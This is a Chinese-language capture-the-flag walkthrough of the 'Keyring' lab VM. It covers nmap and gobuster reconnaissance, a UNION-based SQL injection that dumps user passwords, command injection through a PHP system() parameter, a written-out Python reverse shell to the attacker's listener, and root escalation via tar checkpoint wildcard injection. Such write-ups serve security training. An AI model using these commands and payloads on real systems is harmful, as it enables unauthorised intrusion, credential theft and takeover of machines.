#### 信息收集

1. 主机发现: nmap -sn -PE -n 192.168.1.0/24
   192.168.1.71是新增加的ip，为靶机
2. 端口扫描：nmap -sT --min-rate -p- 192.168.1.71
   PORT   STATE SERVICE
   22/tcp open  ssh
   80/tcp open  http
3. 获取详细服务信息，操作系统版本：nmap -sT -sV -p22,80 -O 192.168.1.71
   PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
   OS details: Linux 3.2 - 4.9
4. 目录爆破，同时查看80端口

##### sql注入查询ssh用户密码

1. 80端口是一个登录界面，注册账号登陆，文件为index.php，此时再次进行目录爆破，(-x 指定后缀)
   gobuster dir -u http://192.168.1.71 -x html,php,bak,txt -w /usr/share/dirbuster/wordlists/
   默认页面的文件外，还有histort.php文件
2. 来到history.php文件发现什么也没有，登出后访问得到，can't find this user's activity，登陆后访问什么也没有，联系到control.php的提示，http参数污染，说明是缺少了什么参数，activity没效果，user=jkl(我注册的)，出现了如下：

   ```
   Pages visited by user jkl

   home

   home

   about

   home

   about

   home

   home
   ```
3. 将你输入的用户名显示到了页面上，可能存在sql注入，将注册的其他账户逐个输入，只要是注册了，都有显示，应该是单引号注入，order by，`jkl%27%20order%20by%201--+`，正常，order by 2，页面空白，联合查询，逐个查询得到以下结果：

   ```
   users

   name,password

   admin,john,wky,www,wwww

   myadmin#p4szw0r4d,Sup3r$S3cr3t$PasSW0RD,123456,12345678,1111
   ```
4. 接着输入admin和john用户查询，admin用户页面：https://github.com/cyberbot75/keyring，访问得到源码
5. control.php中有一个显眼的 `system($_GET['cmdcntr']);`，立刻去尝试cmdntr执行系统命令，失败了，切换admin用户执行，成功
6. 反弹shell

   ```
   kali : nc -nlvp 8888
   web: http://192.168.1.71/control.php?cmdcntr=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.53%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
   ```

   拿到网站权限，提高shell交互性 `python3 -c 'import pty; pty.spawn("/bin/bash")'`

#### 提权

1. 查看有哪些用户，cat /etc/passwd，有john用户，切换用户
2. 进入家目录，发现compress文件，且具有suid权限，执行，目录下多了一个archive.tar压缩包，下载到kali
   `scp ./archive.tar kali@192.168.1.53:/home/kali/Desktop `，解压得到还是compress，再拖到windows，用ida分析 ，看到了这条命令

   `/bin/tar cf archive.tar *`，c创建压缩包，*表示当前目录下的所有文件，将当前目录下的所有文件压缩成 `archive.tar`压缩包

   ```
   一个命令执行时，比如说 ls user.txt password.txt，当user.txt文件名为"-l"时，ls -l password.txt 就会造成文件被当作参数来执行，利用此特性，在当前目录下创建--checkpoint=1，每写入n项记录进行一次检查点操作，--checkpoint-action=exec "/bin/bash"，检查点操作为/bin/bash
   ```
3. 执行命令后拿到root权限

```
[ Keyring - Rooted ]
---------------------------------------------------
Flag : VEhNe0tleXIxbmdfUjAwdDNEXzE4MzEwNTY3fQo=
---------------------------------------------------
by infosecarticles with <3
```
